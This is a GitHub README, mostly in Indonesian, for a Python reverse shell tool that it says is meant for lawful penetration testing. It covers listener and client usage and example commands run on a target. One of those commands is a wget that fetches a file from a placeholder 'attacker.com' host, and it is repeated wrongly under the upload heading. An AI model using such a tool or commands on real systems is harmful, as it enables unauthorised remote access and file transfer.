# Python Reverse Shell Tool
![carbon](https://github.com/user-attachments/assets/b3b3c0a2-c7c9-423d-8652-d2f498aabfd6)

Tool reverse shell sederhana berbasis Python untuk penetration testing yang sah.

## Fitur Utama

- 🚀 **Dual Mode**: Mode listener dan client
- 🔒 **Komunikasi Terenkripsi** (versi advanced)
- 📱 **Multi-Platform**: Bekerja di Windows, Linux, dan macOS
- 💻 **Shell Interaktif**
- 📡 **Port Customizable**

# Fitur Tambahan 
- Detailed logging to file
- Different log levels
- Critical error tracking
- Connection errors (timeout, refused, etc.)
- Command execution errors
- Listener setup errors
- Input validation
- Auto-reconnect mechanism
- Input validation for IP/port
- Better resource cleanup
- Graceful shutdown
- Proper socket cleanup
- Error messages don't reveal sensitive info
- Input sanitization
- Clear error messages
- Colorized output
- Helpful status messages


## Persyaratan

- Python 3.6+
- Modul `cryptography` (untuk versi enkripsi)
 ```console
 pip install cryptography
```
## Install
 ```console
git clone https://github.com/hidayat-tanjung/revershe
chomd +x reverse.py
python3 reverse.py
```
# Cara Penggunaan

1. Star Listener 
 ```console
python3 reverse.py
```
Pilih menu 1 (Start Listener) dan masukkan port (misal 8888)

2. Connect dari komputer lain:
 ```console
python3 reverse.py
```
Pilih menu 2 (Connect to Target) dan masukkan:
* IP target (misal 192.168.1.100)
* Port yang sama (8888)

# Untuk Sistem Linux/Mac
```console
shell> ls          # Lihat isi direktori
shell> pwd         # Lihat direktori saat ini 
shell> ls -la      # Lihat semua file termasuk hidden
shell> tree        # Lihat struktur direktori (jika terinstall)
```
* Untuk Sistem Windows
```console
shell> dir         # Lihat isi direktori
shell> cd          # Lihat direktori saat ini
shell> tree        # Lihat struktur direktori
```
* Karakter khusus
```console
shell> cd "My Documents"
shell> cd /var/www/html
shell> ls
```
* Download direktori target
```console
shell> wget http://attacker.com/file.txt -O /tmp/file.txt
```
* Upoad File ke target
```console
shell> wget http://attacker.com/file.txt -O /tmp/file.txt
```

| Command | Description |
| --- | --- |
| -l | Jalankan sebagai listener |
| -c IP | Hubungkan ke listener di IP target |
| -p PORT | Tentukan port (default: 4444) |
| -i | Mode interaktif |
| -k KEY | Encryption key (versi advanced) |

# Troubleshooting
```console
sudo lsof -i :4444  # Cari proses yang menggunakan port
sudo kill -9 <PID>  # Hentikan proses
```
* Pastikan listener sudah berjalan di target
* Periksa firewall/network configuration
MIT License

Copyright (c) Izumy

[![GitHub](https://img.shields.io/badge/GitHub-View_Project-blue?logo=github)](https://github.com/hidayat-tanjung/revershe/)
